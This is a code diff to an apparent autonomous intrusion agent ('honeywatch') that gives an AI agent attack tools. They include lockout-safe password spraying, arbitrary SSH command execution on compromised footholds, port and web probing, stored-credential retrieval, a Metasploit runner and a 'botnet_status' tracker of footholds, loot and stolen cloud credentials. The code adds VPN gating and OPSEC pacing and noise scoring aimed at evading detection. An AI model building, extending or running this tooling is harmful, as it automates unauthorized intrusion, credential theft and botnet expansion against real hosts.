@@ -52,6 +52,14 @@ class ToolContext:
         self.on_config_change = on_config_change
         self._store: Store | None = None
         self._c2_store: C2Store | None = None
+        self._hypothesis_store: Any | None = None
+        self._audit_store: Any | None = None
+        # Set by the agent loop so hypothesis/audit tools can tag records with
+        # the current run_id + cycle.  Defaults to "interactive" / 0 for the
+        # chat path where no autonomous run is in flight.
+        self.run_id: str = "interactive"
+        self.cycle: int = 0
+        self._opsec_manager: Any = None
 
     @property
     def store(self) -> Store:
@@ -64,6 +72,34 @@ class ToolContext:
         if self._c2_store is None:
             self._c2_store = C2Store(self.db_path)
         return self._c2_store
+
+    @property
+    def hypothesis_store(self):
+        if self._hypothesis_store is None:
+            from honeywatch.agent.hypothesis import HypothesisStore
+            self._hypothesis_store = HypothesisStore(self.db_path)
+        return self._hypothesis_store
+
+    @property
+    def audit_store(self):
+        if self._audit_store is None:
+            from honeywatch.audit import AuditStore
+            self._audit_store = AuditStore(self.db_path)
+        return self._audit_store
+
+    @property
+    def opsec_manager(self):
+        """Lazy-built OpsecManager from the config. Phase 7: pacing + noise scoring."""
+        if self._opsec_manager is None:
+            try:
+                from honeywatch.opsec import OpsecProfile, OpsecManager
+                from honeywatch.config import load_config
+                cfg = load_config()
+                profile = OpsecProfile.from_config(cfg)
+                self._opsec_manager = OpsecManager(profile)
+            except Exception:
+                self._opsec_manager = None
+        return self._opsec_manager
 
 
 def _require_vpn(ctx: ToolContext) -> bool:
@@ -337,6 +373,7 @@ _TOOL_SPECS: list[dict[str, Any]] = [
                 "no_mutations": {"type": "boolean"},
                 "concurrency": {"type": "integer"},
                 "max_attempts": {"type": "integer"},
+                "spray_order": {"type": "boolean", "description": "Iterate one password across all users before the next password (lockout-safe). Default: false (grid order)."},
                 "timeout": {"type": "number"},
                 "skip_vpn_check": {"type": "boolean"},
             },
@@ -423,6 +460,184 @@ _TOOL_SPECS: list[dict[str, Any]] = [
                 "max_rounds": {"type": "integer"},
                 "skip_vpn_check": {"type": "boolean"},
             },
+        },
+    },
+    {
+        "name": "propose_hypothesis",
+        "description": "Declare a hypothesis you are testing so the outcome judge can track whether the evidence confirms or refutes it. Call this before running a tool whose result should prove a specific claim (e.g. 'this host has weak SSH credentials', 'this subnet has honeypots').",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "statement": {"type": "string", "description": "The claim you are testing, e.g. '10.0.0.5 has weak SSH credentials'."},
+                "target": {"type": "string", "description": "Optional target IP/host the hypothesis concerns."},
+                "expected_evidence": {"type": "string", "description": "What evidence would confirm this, e.g. 'valid credentials returned'."},
+            },
+            "required": ["statement"],
+        },
+    },
+    {
+        "name": "list_hypotheses",
+        "description": "Query the hypothesis ledger. Returns open, confirmed, refuted, or all hypotheses for the current run.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "status": {"type": "string", "description": "Filter by status: open, confirmed, refuted, inconclusive, exhausted. omit for all."},
+                "limit": {"type": "integer", "description": "max results (default 50)"},
+            },
+        },
+    },
+    {
+        "name": "score_outcome",
+        "description": "Provide evidence for the outcome judge to evaluate against a hypothesis. The judge determines whether the evidence confirms, refutes, or is inconclusive for the claim. This is how you close a hypothesis after a tool returns results.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "hypothesis_id": {"type": "string", "description": "The hypothesis id returned by propose_hypothesis."},
+                "evidence": {"type": "string", "description": "JSON string of the evidence (typically the tool result dict)."},
+                "tool": {"type": "string", "description": "Name of the tool that produced the evidence (e.g. crack_ssh, grab_shadow). Used to track independent verification — a check from a different tool than the previous one counts as independent."},
+            },
+            "required": ["hypothesis_id", "evidence"],
+        },
+    },
+    {
+        "name": "verify_audit",
+        "description": "Verify the tamper-evident audit chain. Returns whether the chain is intact or where tampering was detected. Pass a run_id to verify only that run's records.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "run_id": {"type": "string", "description": "Optional: verify only this run's records."},
+            },
+        },
+    },
+    {
+        "name": "get_evidence",
+        "description": "Read recent audit-chain records for a target. Returns the last N tool calls, deploys, cracks, and grabs recorded against the target, with their SHA256 chain links.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "target": {"type": "string", "description": "Target IP/host to fetch evidence for."},
+                "limit": {"type": "integer", "description": "max results (default 25)"},
+            },
+            "required": ["target"],
+        },
+    },
+    {
+        "name": "query_capabilities",
+        "description": "List available capability graph nodes — the requires/produces contracts that drive the autonomous chain. Returns which capabilities are ready, blocked, or done given the current fleet state. Use this to understand what the chain can do next and why a phase might be blocked.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "phase": {"type": "string", "description": "Optional: filter by phase (recon, enumerate, spray, foothold, escalate, loot, persist, pivot)."},
+            },
+        },
+    },
+    {
+        "name": "get_capability_details",
+        "description": "Get full details on one capability: its requires, produces, cost, tool name, and current applicability (ready/blocked/done). Use this to understand why a capability is blocked and what it needs.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "name": {"type": "string", "description": "Capability id, e.g. recon, spray, foothold, pivot."},
+            },
+            "required": ["name"],
+        },
+    },
+    {
+        "name": "exec_command",
+        "description": "Run an arbitrary command on a foothold via SSH. Use this for post-exploitation: enumerate services, read configs, plant files, check processes, run privesc checks — anything between the fixed phase boundaries. Requires a stored or provided credential.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "host": {"type": "string", "description": "Target IP."},
+                "port": {"type": "integer", "description": "SSH port (default 22)."},
+                "user": {"type": "string", "description": "SSH username. Defaults to the stored credential's user."},
+                "password": {"type": "string", "description": "SSH password. Defaults to the stored credential's password."},
+                "command": {"type": "string", "description": "Shell command to execute on the target."},
+                "timeout": {"type": "number", "description": "Timeout in seconds (default 15)."},
+                "skip_vpn_check": {"type": "boolean"},
+            },
+            "required": ["host", "command"],
+        },
+    },
+    {
+        "name": "port_scan",
+        "description": "Quick stdlib TCP connect port scanner. No external deps — works on Windows where masscan/zmap don't exist. Bounded concurrency (default 256). Use for single-host port discovery before a full probe.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "targets": {"type": "string", "description": "Comma-separated IPs or CIDRs, e.g. 10.0.0.5 or 10.0.0.0/24."},
+                "ports": {"type": "string", "description": "Comma-separated ports or ranges, e.g. 22,80,443 or 1-1000 (default: 22,80,443,8080)."},
+                "timeout": {"type": "number", "description": "Per-port timeout in seconds (default 2)."},
+                "concurrency": {"type": "integer", "description": "Max concurrent connections (default 256)."},
+                "skip_vpn_check": {"type": "boolean"},
+            },
+            "required": ["targets"],
+        },
+    },
+    {
+        "name": "web_probe",
+        "description": "HTTP probe via stdlib urllib. Grabs status code, headers, and optionally checks common paths (/admin, /.env, /wp-login.php, etc.). Use to detect web services and find web-based initial access vectors.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "Target URL, e.g. http://10.0.0.5:8080/."},
+                "paths": {"type": "string", "description": "Comma-separated paths to check (default: /admin, /.env, /wp-login.php, /robots.txt, /.git/HEAD)."},
+                "timeout": {"type": "number", "description": "Request timeout in seconds (default 5)."},
+            },
+            "required": ["url"],
+        },
+    },
+    {
+        "name": "credential_for",
+        "description": "Query stored credentials for a specific host. Returns all recovered credentials (user, password, source) for the given IP+port.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "host": {"type": "string", "description": "Target IP."},
+                "port": {"type": "integer", "description": "SSH port (optional, default all ports)."},
+            },
+            "required": ["host"],
+        },
+    },
+    {
+        "name": "test_credential",
+        "description": "Verify a credential works by attempting a quick SSH auth check. Use before deploying to avoid wasting a deploy task on a rotated credential. Defaults to the stored credential for the host if no password is provided.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "host": {"type": "string", "description": "Target IP."},
+                "port": {"type": "integer", "description": "SSH port (default 22)."},
+                "user": {"type": "string", "description": "SSH username (defaults to stored)."},
+                "password": {"type": "string", "description": "SSH password (defaults to stored)."},
+                "skip_vpn_check": {"type": "boolean"},
+            },
+            "required": ["host"],
+        },
+    },
+    {
+        "name": "botnet_status",
+        "description": "Query the current chain state: round, hosts discovered, sprayable hosts, credentials recovered, footholds, enqueued deploys, pivoted subnets, loot count, cloud creds. Use to understand what the chain has accomplished so far.",
+        "parameters": {
+            "type": "object",
+            "properties": {},
+        },
+    },
+    {
+        "name": "metasploit",
+        "description": "Run a Metasploit module against a target with a recovered credential. Generates a resource script, runs msfconsole -q -r, and captures output. Unlocks SSH post-exploitation modules (session enumeration, hashdump, route/pivoting, port forwarding). Requires msfconsole on PATH.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "host": {"type": "string", "description": "Target IP."},
+                "port": {"type": "integer", "description": "SSH port (default 22)."},
+                "user": {"type": "string", "description": "SSH username (defaults to stored)."},
+                "password": {"type": "string", "description": "SSH password (defaults to stored)."},
+                "module": {"type": "string", "description": "Metasploit module path (default: auxiliary/scanner/ssh/ssh_version)."},
+                "options": {"type": "string", "description": "JSON dict of additional msf set options, e.g. {\"RHOSTS\":\"10.0.0.5\",\"VERBOSE\":\"true\"}."},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default 60)."},
+                "skip_vpn_check": {"type": "boolean"},
+            },
+            "required": ["host"],
         },
     },
 ]
@@ -787,6 +1002,7 @@ def _tool_crack_ssh(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
             ip=ip, port=port, users=users, passwords=passwords,
             wordlist=wordlist, mutations=mutations,
             max_attempts=max_attempts, timeout_s=timeout_s,
+            spray_order=bool(args.get("spray_order", False)),
         )
         for ip, port in hosts
     ]
@@ -872,6 +1088,8 @@ def _tool_grab_loot(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
         "pivot_targets": len(res.pivot_targets),
         "metadata": res.metadata,
         "competing_miners": res.competing_miners,
+        "installed_packages": len(res.installed_packages),
+        "vulnerable_packages": res.vulnerable_packages,
         "summary": res.summary(),
         "error": res.error,
     }
@@ -1007,6 +1225,535 @@ def _set(obj, name: str, value: Any) -> None:
         pass
 
 
+# --------------------------------------------------------------------------- #
+# Hypothesis + audit tools (Phase 1+2)
+# --------------------------------------------------------------------------- #
+
+
+def _tool_propose_hypothesis(args, ctx):
+    """Declare a hypothesis for the outcome judge to track."""
+    statement = args.get("statement", "").strip()
+    if not statement:
+        return {"error": "statement is required"}
+    # run_id / cycle are set by the agent loop when it wires the context; fall
+    # back to a session-derived id when not set (e.g. interactive chat).
+    run_id = getattr(ctx, "run_id", "") or "interactive"
+    cycle = getattr(ctx, "cycle", 0) or 0
+    hyp = ctx.hypothesis_store.propose(
+        run_id=run_id,
+        cycle=cycle,
+        statement=statement,
+        target=args.get("target", ""),
+        expected_evidence=args.get("expected_evidence", ""),
+    )
+    return {
+        "hypothesis_id": hyp.id,
+        "status": hyp.status.value if hasattr(hyp.status, "value") else str(hyp.status),
+        "statement": hyp.statement,
+    }
+
+
+def _tool_list_hypotheses(args, ctx):
+    """Query the hypothesis ledger."""
+    status = args.get("status", "").strip() or None
+    limit = int(args.get("limit", 50))
+    run_id = getattr(ctx, "run_id", "") or "interactive"
+    hyps = ctx.hypothesis_store.all_hypotheses(run_id=run_id, status=status, limit=limit)
+    return {
+        "count": len(hyps),
+        "hypotheses": [
+            {
+                "id": h.id,
+                "status": h.status.value if hasattr(h.status, "value") else str(h.status),
+                "statement": h.statement,
+                "target": h.target,
+                "confidence": h.confidence,
+                "tool": h.tool,
+                "attempts": h.attempt_count,
+            }
+            for h in hyps
+        ],
+    }
+
+
+def _tool_score_outcome(args, ctx):
+    """Provide evidence for the outcome judge to evaluate against a hypothesis."""
+    hyp_id = args.get("hypothesis_id", "").strip()
+    if not hyp_id:
+        return {"error": "hypothesis_id is required"}
+    evidence_str = args.get("evidence", "")
+    try:
+        evidence = json.loads(evidence_str) if isinstance(evidence_str, str) else evidence_str
+    except (json.JSONDecodeError, TypeError):
+        evidence = {"raw": evidence_str}
+
+    hyp = ctx.hypothesis_store.get(hyp_id)
+    if hyp is None:
+        return {"error": f"hypothesis {hyp_id!r} not found"}
+
+    from honeywatch.agent.hypothesis import judge_outcome
+    judgment = judge_outcome(hyp, evidence if isinstance(evidence, dict) else {})
+    tool_name = args.get("tool", "").strip() or None
+    updated = ctx.hypothesis_store.judge(
+        hyp_id, judgment,
+        evidence=evidence if isinstance(evidence, dict) else {},
+        tool_name=tool_name,
+    )
+    if updated is None:
+        return {"error": "could not update hypothesis (already terminal or not found)"}
+    return {
+        "hypothesis_id": updated.id,
+        "operational_success": judgment.operational_success,
+        "evidential_status": updated.status.value if hasattr(updated.status, "value") else str(updated.status),
+        "confidence": updated.confidence,
+        "evidence_summary": judgment.evidence_summary,
+        "attempts": updated.attempt_count,
+    }
+
+
+def _tool_verify_audit(args, ctx):
+    """Verify the tamper-evident audit chain."""
+    run_id = args.get("run_id", "").strip() or None
+    valid, reason = ctx.audit_store.verify_chain(run_id=run_id)
+    return {"chain_valid": valid, "reason": reason}
+
+
+def _tool_get_evidence(args, ctx):
+    """Read recent audit-chain records for a target."""
+    target = args.get("target", "").strip()
+    if not target:
+        return {"error": "target is required"}
+    limit = int(args.get("limit", 25))
+    records = ctx.audit_store.recent(target_ip=target, limit=limit)
+    # Trim the records for the model — full result_json can be large.
+    trimmed = []
+    for rec in records:
+        trimmed.append({
+            "seq": rec.get("seq"),
+            "cycle": rec.get("cycle"),
+            "tool": rec.get("tool"),
+            "action": rec.get("action"),
+            "timestamp": rec.get("timestamp"),
+            "this_hash": (rec.get("this_hash") or "")[:12] + "...",
+            "prev_hash": (rec.get("prev_hash") or "")[:12] + "...",
+        })
+    return {"count": len(trimmed), "records": trimmed}
+
+
+# --------------------------------------------------------------------------- #
+# Capability graph tools (Phase 3)
+# --------------------------------------------------------------------------- #
+
+
+def _tool_query_capabilities(args, ctx):
+    """List available capability graph nodes + their ready/blocked/done status."""
+    from honeywatch.capability import build_default_graph, ChainContext
+    graph = build_default_graph()
+    # Build a lightweight context from the store state.
+    state = _build_chain_context_state(ctx)
+    cap_ctx = ChainContext(
+        state=state, config=_build_chain_config_stub(ctx),
+        hypothesis_store=ctx.hypothesis_store,
+        run_id=getattr(ctx, "run_id", ""),
+    )
+    phase_filter = args.get("phase", "").strip() or None
+    ready = graph.next_capabilities(cap_ctx)
+    blocked = graph.blocked_capabilities(cap_ctx)
+    caps_info = []
+    for cap in graph.capabilities:
+        if phase_filter and cap.phase_hint.value != phase_filter:
+            continue
+        is_ready = cap in ready
+        is_blocked = any(cap.id == b[0].id for b in blocked)
+        missing = []
+        for b_cap, b_missing in blocked:
+            if b_cap.id == cap.id:
+                missing = b_missing
+        caps_info.append({
+            "id": cap.id,
+            "name": cap.name,
+            "phase": cap.phase_hint.value,
+            "requires": cap.requires,
+            "produces": cap.produces,
+            "status": "ready" if is_ready else ("blocked" if is_blocked else "done"),
+            "missing": missing,
+            "cost": cap.cost,
+        })
+    return {"count": len(caps_info), "capabilities": caps_info}
+
+
+def _tool_get_capability_details(args, ctx):
+    """Get full details on one capability node."""
+    name = args.get("name", "").strip()
+    if not name:
+        return {"error": "name is required"}
+    from honeywatch.capability import build_default_graph, ChainContext
+    graph = build_default_graph()
+    cap = graph.get(name)
+    if cap is None:
+        return {"error": f"unknown capability: {name!r}"}
+    state = _build_chain_context_state(ctx)
+    cap_ctx = ChainContext(
+        state=state, config=_build_chain_config_stub(ctx),
+        hypothesis_store=ctx.hypothesis_store,
+        run_id=getattr(ctx, "run_id", ""),
+    )
+    applicability = cap.applicability(cap_ctx)
+    missing = graph.missing_prerequisites(cap, cap_ctx)
+    producers = graph.find_producers(missing[0]) if missing else []
+    return {
+        "id": cap.id,
+        "name": cap.name,
+        "phase": cap.phase_hint.value,
+        "requires": cap.requires,
+        "produces": cap.produces,
+        "cost": cap.cost,
+        "tool_name": cap.tool_name,
+        "applicability": applicability,
+        "status": "ready" if applicability > 0 else ("blocked" if missing else "done"),
+        "missing_prerequisites": missing,
+        "producers_for_missing": [
+            {"id": p.id, "name": p.name} for p in producers
+        ] if missing else [],
+    }
+
+
+def _build_chain_context_state(ctx):
+    """Build a lightweight state object from the store for capability graph queries."""
+    from honeywatch.chain import ChainState
+    state = ChainState()
+    try:
+        rows = ctx.store.query(limit=100000)
+        state.hosts = [(r["ip"], int(r["port"])) for r in rows]
+    except Exception:
+        pass
+    try:
+        creds = ctx.store.query_credentials(limit=100000)
+        state.credentials = list(creds)
+    except Exception:
+        pass
+    try:
+        from honeywatch.c2.store import C2Store
+        c2 = C2Store(ctx.db_path)
+        tasks = c2.list_tasks()
+        state.enqueued = [(t.get("target", {}).get("ip", ""), int(t.get("target", {}).get("port", 22)))
+                          for t in tasks if t.get("status") != "completed"]
+    except Exception:
+        pass
+    return state
+
+
+def _build_chain_config_stub(ctx):
+    """Build a minimal config stub for ChainContext.has_artifact()."""
+    from honeywatch.chain import ChainConfig
+    cfg = ChainConfig(targets=[])
+    cfg.shadow_stash = ".honeywatch/shadow_stash"
+    return cfg
+
+
+# --------------------------------------------------------------------------- #
+# Phase 8+: New agent tools (exec_command, port_scan, web_probe,
+#           credential_for, test_credential, botnet_status, metasploit)
+# --------------------------------------------------------------------------- #
+
+
+def _tool_exec_command(args, ctx):
+    """Run an arbitrary command on a foothold via SSH."""
+    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
+    if not skip and not _require_vpn(ctx):
+        return {"error": "VPN gate blocked. Connect Mullvad or pass skip_vpn_check=true."}
+    host = args.get("host", "").strip()
+    if not host:
+        return {"error": "host is required"}
+    port = int(args.get("port", 22))
+    command = args.get("command", "").strip()
+    if not command:
+        return {"error": "command is required"}
+    timeout = float(args.get("timeout", 15))
+    # Resolve credential: provided args > stored cred.
+    user = args.get("user", "").strip()
+    password = args.get("password", "").strip()
+    if not user or not password:
+        cred = ctx.store.credential_for(host, port)
+        if cred:
+            user = user or cred.get("user", "")
+            password = password or cred.get("password", "")
+    if not user:
+        return {"error": f"no credential for {host}:{port} and no user provided"}
+    # Use the chain's _ssh_exec for consistency.
+    from honeywatch.chain import _ssh_exec
+    key_path = None
+    if password and password.startswith("key:"):
+        key_path = password[4:]
+        password = None
+    rc, out, err = _ssh_exec(host, port, user, password, key_path, command, timeout)
+    return {
+        "host": host, "port": port, "user": user,
+        "command": command[:200], "returncode": rc,
+        "stdout": (out or "")[:4000], "stderr": (err or "")[:1000] if err else None,
+    }
+
+
+def _tool_port_scan(args, ctx):
+    """Quick stdlib TCP connect port scanner."""
+    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
+    if not skip and not _require_vpn(ctx):
+        return {"error": "VPN gate blocked. Connect Mullvad or pass skip_vpn_check=true."}
+    targets_str = args.get("targets", "").strip()
+    if not targets_str:
+        return {"error": "targets is required"}
+    from honeywatch.cli import parse_ports
+    ports = parse_ports(args.get("ports", "22,80,443,8080"))
+    timeout = float(args.get("timeout", 2))
+    concurrency = int(args.get("concurrency", 256))
+    # Expand targets (IPs + CIDRs).
+    import ipaddress
+    ips: list[str] = []
+    for spec in targets_str.split(","):
+        spec = spec.strip()
+        if not spec:
+            continue
+        try:
+            if "/" in spec:
+                net = ipaddress.ip_network(spec, strict=False)
+                ips.extend(str(ip) for ip in net.hosts()[:4096])
+            else:
+                ips.append(spec)
+        except ValueError:
+            ips.append(spec)
+    # Async TCP connect scan.
+    import asyncio
+    async def _scan():
+        sem = asyncio.Semaphore(concurrency)
+        results: dict[str, list[int]] = {}
+        async def _probe(ip: str, port: int):
+            async with sem:
+                try:
+                    _, writer = await asyncio.wait_for(
+                        asyncio.open_connection(ip, port), timeout=timeout)
+                    writer.close()
+                    try:
+                        await writer.wait_closed()
+                    except Exception:
+                        pass
+                    results.setdefault(ip, []).append(port)
+                except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
+                    pass
+        tasks = [_probe(ip, p) for ip in ips for p in ports]
+        await asyncio.gather(*tasks)
+        return results
+    try:
+        results = asyncio.run(_scan())
+    except RuntimeError:
+        # Already in an event loop — run in a thread.
+        import concurrent.futures
+        with concurrent.futures.ThreadPoolExecutor() as pool:
+            results = pool.submit(asyncio.run, _scan()).result()
+    open_hosts = {ip: sorted(ps) for ip, ps in results.items() if ps}
+    return {
+        "targets": targets_str, "ports_scanned": len(ports),
+        "hosts_up": len(open_hosts),
+        "open_ports": {ip: ps for ip, ps in open_hosts.items()},
+    }
+
+
+def _tool_web_probe(args, ctx):
+    """HTTP probe via stdlib urllib."""
+    url = args.get("url", "").strip()
+    if not url:
+        return {"error": "url is required"}
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url
+    timeout = float(args.get("timeout", 5))
+    paths_str = args.get("paths", "")
+    if paths_str:
+        paths = [p.strip() if p.strip().startswith("/") else "/" + p.strip()
+                 for p in paths_str.split(",") if p.strip()]
+    else:
+        paths = ["/admin", "/.env", "/wp-login.php", "/robots.txt", "/.git/HEAD"]
+    import urllib.request
+    import urllib.error
+    findings: list[dict] = []
+    # Probe the base URL first.
+    try:
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            findings.append({
+                "path": "/", "status": resp.status,
+                "headers": dict(resp.headers),
+            })
+    except urllib.error.HTTPError as exc:
+        findings.append({"path": "/", "status": exc.code, "headers": dict(exc.headers)})
+    except Exception as exc:
+        findings.append({"path": "/", "error": f"{type(exc).__name__}: {exc}"})
+    # Probe paths.
+    for path in paths:
+        full_url = url.rstrip("/") + path
+        try:
+            req = urllib.request.Request(full_url, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=timeout) as resp:
+                body = resp.read(2048)
+                findings.append({
+                    "path": path, "status": resp.status,
+                    "content_type": resp.headers.get("Content-Type", ""),
+                    "body_preview": body.decode("utf-8", "replace")[:200],
+                })
+        except urllib.error.HTTPError as exc:
+            findings.append({"path": path, "status": exc.code})
+        except Exception:
+            pass  # connection refused, timeout, etc. — skip
+    return {"url": url, "findings": findings, "paths_checked": len(paths) + 1}
+
+
+def _tool_credential_for(args, ctx):
+    """Query stored credentials for a specific host."""
+    host = args.get("host", "").strip()
+    if not host:
+        return {"error": "host is required"}
+    port = args.get("port")
+    creds = ctx.store.query_credentials(limit=100000)
+    filtered = [c for c in creds if c.get("ip") == host]
+    if port:
+        filtered = [c for c in filtered if int(c.get("port", 22)) == int(port)]
+    return {
+        "host": host, "port": port,
+        "count": len(filtered),
+        "credentials": [
+            {"user": c.get("user", ""), "password": c.get("password", ""),
+             "source": c.get("source", ""), "port": c.get("port", 22)}
+            for c in filtered
+        ],
+    }
+
+
+def _tool_test_credential(args, ctx):
+    """Verify a credential works by attempting a quick SSH auth check."""
+    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
+    if not skip and not _require_vpn(ctx):
+        return {"error": "VPN gate blocked. Connect Mullvad or pass skip_vpn_check=true."}
+    host = args.get("host", "").strip()
+    if not host:
+        return {"error": "host is required"}
+    port = int(args.get("port", 22))
+    user = args.get("user", "").strip()
+    password = args.get("password", "").strip()
+    if not user or not password:
+        cred = ctx.store.credential_for(host, port)
+        if cred:
+            user = user or cred.get("user", "")
+            password = password or cred.get("password", "")
+    if not user:
+        return {"error": f"no credential for {host}:{port} and no user provided"}
+    from honeywatch.chain import _ssh_exec
+    key_path = None
+    if password and password.startswith("key:"):
+        key_path = password[4:]
+        password = None
+    rc, out, err = _ssh_exec(host, port, user, password, key_path, "id", 10)
+    success = rc == 0 and "uid=" in (out or "")
+    return {
+        "host": host, "port": port, "user": user,
+        "valid": success, "returncode": rc,
+        "output": (out or "")[:200],
+    }
+
+
+def _tool_botnet_status(args, ctx):
+    """Query the current chain state from the store."""
+    state = _build_chain_context_state(ctx)
+    return {
+        "hosts_discovered": len(state.hosts),
+        "sprayable_hosts": len(state.sprayable),
+        "credentials_recovered": len(state.credentials),
+        "footholds": len(state.footholds),
+        "enqueued_deploys": len(state.enqueued),
+        "pivoted_subnets": len(state.pivoted_subnets),
+        "loot_items": len(state.loot),
+        "cloud_creds": len(state.cloud_creds),
+        "recovered_ssh_keys": len(state.recovered_ssh_keys),
+        "foothold_details": [
+            {"ip": f[0], "port": f[1], "user": f[2]}
+            for f in state.footholds[:20]
+        ],
+        "host_list": [f"{ip}:{port}" for ip, port in state.hosts[:50]],
+    }
+
+
+def _tool_metasploit(args, ctx):
+    """Run a Metasploit module against a target via msfconsole."""
+    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
+    if not skip and not _require_vpn(ctx):
+        return {"error": "VPN gate blocked. Connect Mullvad or pass skip_vpn_check=true."}
+    host = args.get("host", "").strip()
+    if not host:
+        return {"error": "host is required"}
+    port = int(args.get("port", 22))
+    user = args.get("user", "").strip()
+    password = args.get("password", "").strip()
+    if not user or not password:
+        cred = ctx.store.credential_for(host, port)
+        if cred:
+            user = user or cred.get("user", "")
+            password = password or cred.get("password", "")
+    if not user:
+        return {"error": f"no credential for {host}:{port} and no user provided"}
+    module = args.get("module", "auxiliary/scanner/ssh/ssh_version").strip()
+    timeout = int(args.get("timeout", 60))
+    # Parse additional options.
+    options: dict[str, str] = {}
+    opts_str = args.get("options", "")
+    if opts_str:
+        try:
+            options = json.loads(opts_str) if isinstance(opts_str, str) else opts_str
+        except (json.JSONDecodeError, TypeError):
+            options = {}
+    # Check msfconsole is available.
+    import shutil
+    if not shutil.which("msfconsole"):
+        return {"error": "msfconsole not found on PATH. Install Metasploit Framework."}
+    # Build a resource script.
+    rc_lines = [
+        f"use {module}",
+        f"set RHOSTS {host}",
+        f"set RHOST {host}",
+        f"set RPORT {port}",
+        f"set USERNAME {user}",
+        f"set PASSWORD {password}",
+    ]
+    for key, value in options.items():
+        rc_lines.append(f"set {key} {value}")
+    rc_lines.append("run")
+    rc_lines.append("exit")
+    rc_script = "\n".join(rc_lines)
+    # Write the resource script to a temp file and run msfconsole.
+    import subprocess
+    import tempfile
+    import os
+    try:
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False, prefix="honeywatch_msf_") as f:
+            f.write(rc_script)
+            rc_path = f.name
+        proc = subprocess.run(
+            ["msfconsole", "-q", "-r", rc_path],
+            capture_output=True, text=True, timeout=timeout,
+        )
+        return {
+            "host": host, "port": port, "module": module,
+            "returncode": proc.returncode,
+            "stdout": (proc.stdout or "")[:4000],
+            "stderr": (proc.stderr or "")[:1000] if proc.stderr else None,
+        }
+    except subprocess.TimeoutExpired:
+        return {"error": f"msfconsole timed out after {timeout}s"}
+    except Exception as exc:
+        return {"error": f"msfconsole failed: {type(exc).__name__}: {exc}"}
+    finally:
+        try:
+            os.unlink(rc_path)
+        except Exception:
+            pass
+
+
 # Register tools.
 _tool("list_payloads", _tool_list_payloads)
 _tool("get_status", _tool_get_status)
@@ -1024,10 +1771,36 @@ _tool("grab_shadow", _tool_grab_shadow)
 _tool("grab_loot", _tool_grab_loot)
 _tool("hashcrack", _tool_hashcrack)
 _tool("run_chain", _tool_run_chain)
+_tool("propose_hypothesis", _tool_propose_hypothesis)
+_tool("list_hypotheses", _tool_list_hypotheses)
+_tool("score_outcome", _tool_score_outcome)
+_tool("verify_audit", _tool_verify_audit)
+_tool("get_evidence", _tool_get_evidence)
+_tool("query_capabilities", _tool_query_capabilities)
+_tool("get_capability_details", _tool_get_capability_details)
+_tool("exec_command", _tool_exec_command)
+_tool("port_scan", _tool_port_scan)
+_tool("web_probe", _tool_web_probe)
+_tool("credential_for", _tool_credential_for)
+_tool("test_credential", _tool_test_credential)
+_tool("botnet_status", _tool_botnet_status)
+_tool("metasploit", _tool_metasploit)
 
 
 def execute_tool(name: str, args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
-    """Execute a tool by name and return its result."""
+    """Execute a tool by name and return its result.
+
+    Every call is recorded to the tamper-evident audit chain (Phase 2) so the
+    operator can prove what actually ran on each target.  The record captures
+    the tool name, redacted arguments, redacted result, and the SHA256 chain
+    link.  Recording is best-effort: an audit failure never breaks the tool.
+
+    Phase 7: OPSEC pacing + noise scoring are applied here so every tool call
+    is rate-limited and scored regardless of whether the model asked for it.
+    The pacing uses the OpsecManager's sync pacing_delay (time.sleep) since
+    execute_tool is a sync function; the async acquire_pacing is available for
+    the chain's async phases.
+    """
     if name not in TOOL_REGISTRY:
         return {"error": f"unknown tool: {name!r}"}
     # Validate required args up front so an omitted required argument produces a
@@ -1044,7 +1817,62 @@ def execute_tool(name: str, args: dict[str, Any], ctx: ToolContext) -> dict[str,
                     f"{', '.join(missing)}"
                 )
             }
+
+    # Phase 7: OPSEC pacing — sleep before the tool runs so rate limiting +
+    # min-gap delays actually fire at runtime.  Best-effort: a pacing failure
+    # never blocks the tool.
+    noise_score = 0
     try:
-        return TOOL_REGISTRY[name]["func"](args, ctx)
+        mgr = ctx.opsec_manager
+        if mgr is not None:
+            # Resolve the profile for the target (auto-disable for local IPs).
+            target_ip = (args or {}).get("host") or (args or {}).get("target") or (args or {}).get("ip") or ""
+            if target_ip and isinstance(target_ip, str):
+                mgr = mgr.resolve_for_target(target_ip)
+            # Sync pacing delay (time.sleep).
+            delay = mgr.pacing_delay("normal")
+            if delay > 0:
+                import time as _time
+                _time.sleep(delay)
+            # Score the tool's noise level for the audit record.
+            noise_info = mgr.score_command_noise(name)
+            noise_score = noise_info.get("score", 0)
+    except Exception:
+        pass
+
+    try:
+        result = TOOL_REGISTRY[name]["func"](args, ctx)
     except Exception as exc:
-        return {"error": f"tool {name!r} failed: {exc!r}"}
+        result = {"error": f"tool {name!r} failed: {exc!r}"}
+
+    # Record to the audit chain.  Best-effort: never let an audit failure
+    # surface as a tool failure to the model.
+    try:
+        safe_args = args or {}
+        target_ip = (
+            safe_args.get("host") or safe_args.get("target") or safe_args.get("ip")
+            or safe_args.get("targets") or ""
+        )
+        if isinstance(target_ip, list):
